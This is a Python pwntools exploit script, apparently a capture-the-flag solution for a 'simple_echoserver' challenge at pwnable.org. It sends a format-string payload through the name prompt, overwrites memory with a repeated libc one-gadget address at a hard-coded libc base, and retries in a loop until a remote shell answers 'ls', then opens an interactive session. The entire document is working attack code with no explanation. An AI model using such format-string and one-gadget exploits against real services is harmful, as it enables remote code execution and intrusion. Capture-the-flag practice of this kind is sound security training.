from pwn import *
import time
gadgets=[0x4f322,0x4f2c5,0xe569f,0xe5858,0xe585f,0xe5863,0x10a38c,0x10a398]
gadgets=[0x4f322]
while(True):

	#target=process('./simple_echoserver')
	target=remote('pwnable.org',12020)

	libc_base=0x7ffff79e4000
	libc_gadget=libc_base+0x4f322

	def cycle(name):
		(target.recvuntil("name: "))
		target.sendline(name)
		(target.recvuntil("phone: "))
		target.sendline(str(0x1))
		time.sleep(1)
		(target.recvuntil("elf!\n"))
		target.sendline(p64(libc_gadget)*20+"\x00"*(0xf8-8*20))
		(target.recvline())
		target.sendline("~.\x00")

	name="%"+str(0x10-0xd)+"x"+"%7$hhn"
	cycle(name)
	r=""
	try:
		target.sendline("ls")
		r=target.recv()
		print(r)
	except:
		print("fail")
		target.close()
	
	if(len(r)>0):
		target.interactive()


